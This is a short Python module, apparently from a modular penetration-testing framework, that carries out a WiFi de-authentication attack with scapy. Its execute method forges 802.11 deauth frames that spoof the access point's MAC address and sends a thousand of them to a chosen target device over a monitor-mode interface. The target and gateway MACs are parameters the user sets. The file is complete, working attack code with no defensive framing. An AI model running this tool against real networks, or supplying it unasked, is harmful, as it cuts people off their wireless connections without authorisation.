from scapy.all import *
from core import base

conf.verb = 0


class Main(base.Module):
    """Force device to disconnect from WIFI - De-authentication attack """

    parameters = {
        "target_mac": "11:11:11:11:11:11",
        "gateway_mac": "22:22:22:22:22:22",
        "iface": "wlan0mon"

    }
    completions = list(parameters.keys())

    def do_execute(self, line):
        """Execute current module"""

        self.cp.success(text=f"Starting De-authentication attack on {self.parameters['target_mac']}")
        self.cp.info(text="Press Ctrl+C for stop...")
        # 802.11 frame
        # addr1: destination MAC
        # addr2: source MAC
        # addr3: Access Point MAC
        dot11 = Dot11(addr1=self.parameters['target_mac'], addr2=self.parameters['gateway_mac'], addr3=self.parameters['gateway_mac'])
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        sendp(packet, inter=0.1, count=1000, iface=self.parameters['iface'], verbose=1)

    def complete_set(self, text, line, begidx, endidx):
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.completions if s.startswith(mline)]